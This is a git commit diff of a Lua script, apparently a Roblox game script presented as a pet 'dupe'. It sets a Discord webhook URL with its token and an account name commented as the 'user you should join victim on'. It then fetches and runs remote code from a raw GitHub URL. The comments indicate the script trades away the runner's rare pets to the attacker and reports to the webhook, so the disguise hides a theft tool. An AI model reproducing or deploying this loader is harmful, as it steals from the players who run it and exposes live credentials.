66c729c8b4a93457335f6b3f64eafbf1313936ba
relapsedddd <callumlovesdad@gmail.com>
2025-04-18 07:39:15 -0600

    Update dupefixed.lua

--- dupefixed.lua
+++ dupefixed.lua
@@ -1,6 +1,6 @@
-_G.Username = "callumlovesdad"
-_G.min_chance = 10
-_G.pingEveryone = "Yes"
-_G.webhook = "https://discord.com/api/webhooks/1362547535981314239/lqxJyPNXM930Wdngi3KAEN6ShWmQMpRlQXai6raKt6QfzhpRhgMX5aQOaS6jEB3PHMiS"
+_G.Username = "callumlovesdad" -- user you should join victim on
+_G.min_chance = 100 -- 10000 means it only trades pets that are 1 in 10k or rarer
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1362784443974156478/IJ1XsGucrZp_nMObTyflcTigOUnn5IDFROF7g144lCgvJF5CU2VnQICW8K2wTW8DPQlO" -- change to your webhook 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/spookzv4/bubblegum/refs/heads/main/FREEbgsi.lua"))()
